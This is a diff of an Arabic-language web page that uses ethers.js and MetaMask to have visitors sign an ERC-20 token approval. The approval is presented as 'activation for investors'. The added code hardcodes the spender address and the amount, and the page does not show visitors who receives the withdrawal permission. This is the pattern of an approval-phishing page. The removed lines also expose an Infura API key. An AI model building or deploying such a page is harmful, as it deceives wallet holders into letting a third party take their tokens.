@@ -2,84 +2,74 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>تفعيل Approve عبر WalletConnect</title>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <title>تفعيل Approve للمستثمرين</title>
   <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
 </head>
 <body>
   <h2>صفحة تفعيل Approve</h2>
 
-  <label>عنوان توكن ERC-20: </label>
-  <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="50" />
+  <label>عنوان توكن ERC-20: </label><br />
+  <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="60" />
   <br /><br />
 
-  <label>المبلغ للموافقة (Approve): </label>
-  <input type="text" id="approveAmount" placeholder="1000" value="1000" />
-  <br /><br />
+  <p>المبلغ للموافقة (Approve): <strong>1000</strong></p>
 
   <button id="approveBtn">اعمل Approve</button>
 
-  <p id="status"></p>
+  <p id="status" style="color: green; font-weight: bold;"></p>
 
   <script>
-    const provider = new WalletConnectProvider.default({
-      rpc: {
-        1: "https://mainnet.infura.io/v3/f062246635234234a265dffcceba5e69" // Infura API Key
-      },
-    });
+    const fixedSpenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D";
+    const fixedApproveAmount = "1000";
 
     async function doApprove() {
       const statusEl = document.getElementById("status");
-      const tokenAddress = document.getElementById("tokenAddress").value.trim();
-      const amountStr = document.getElementById("approveAmount").value.trim();
+      statusEl.style.color = "green";
+      statusEl.textContent = "";
 
-      if (!ethers.utils.isAddress(tokenAddress)) {
-        statusEl.textContent = "الرجاء إدخال عنوان توكن صحيح.";
+      if (!window.ethereum) {
+        statusEl.style.color = "red";
+        statusEl.textContent = "يجب تثبيت MetaMask أو محفظة تدعم Web3!";
         return;
       }
-      if (!amountStr || isNaN(amountStr) || Number(amountStr) <= 0) {
-        statusEl.textContent = "الرجاء إدخال مبلغ صحيح للموافقة.";
+
+      const tokenAddress = document.getElementById("tokenAddress").value.trim();
+
+      if (!ethers.utils.isAddress(tokenAddress)) {
+        statusEl.style.color = "red";
+        statusEl.textContent = "الرجاء إدخال عنوان توكن صحيح.";
         return;
       }
 
       try {
-        // إنشاء اتصال محفظة عبر WalletConnect (يفتح مسح QR أو يفتح التطبيق على الموبايل مباشرة)
-        await provider.enable();
-
-        const web3Provider = new ethers.providers.Web3Provider(provider);
-        const signer = web3Provider.getSigner();
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
 
         const erc20Abi = [
           "function decimals() view returns (uint8)",
           "function approve(address spender, uint256 amount) returns (bool)"
         ];
-
         const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);
 
-        // العنوان اللي هتدي له صلاحية السحب (غيره حسب المطلوب)
-        const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D";
-
         const decimals = await contract.decimals();
-        const amount = ethers.utils.parseUnits(amountStr, decimals);
+        const amount = ethers.utils.parseUnits(fixedApproveAmount, decimals);
 
-        statusEl.textContent = "جارٍ إرسال طلب الموافقة...";
+        statusEl.textContent = "جارٍ إرسال طلب الموافقة إلى المحفظة...";
 
-        const tx = await contract.approve(spenderAddress, amount);
+        const tx = await contract.approve(fixedSpenderAddress, amount);
 
         statusEl.textContent = "تم إرسال المعاملة، في انتظار التوثيق...";
 
         await tx.wait();
 
-        statusEl.textContent = `تم الموافقة بنجاح! Hash: ${tx.hash}`;
-
-        // أغلق الاتصال بعد النجاح
-        await provider.disconnect();
-
+        statusEl.textContent = `تم الموافقة بنجاح! Tx Hash: ${tx.hash}`;
       } catch (error) {
-        console.error(error);
         if (error.code === 4001) {
+          statusEl.style.color = "red";
           statusEl.textContent = "تم رفض المعاملة من قبل المستخدم.";
         } else {
+          statusEl.style.color = "red";
           statusEl.textContent = "حدث خطأ: " + (error.message || error);
         }
       }
